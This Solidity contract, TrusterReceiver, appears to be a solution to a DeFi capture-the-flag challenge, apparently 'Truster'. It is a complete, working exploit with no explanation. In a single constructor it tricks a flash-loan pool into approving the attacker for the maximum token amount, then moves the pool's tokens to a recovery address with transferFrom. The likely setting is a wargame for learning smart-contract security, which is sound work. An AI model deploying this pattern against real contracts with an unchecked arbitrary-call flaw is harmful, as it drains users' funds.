// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TrusterReceiver {
    constructor(uint256 _tokenAmount, address _pool, address _token, address _recovery) {
        _pool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                _pool,
                _token,
                abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
            )
        );
        _token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", _pool, _recovery, _tokenAmount));
    }
}
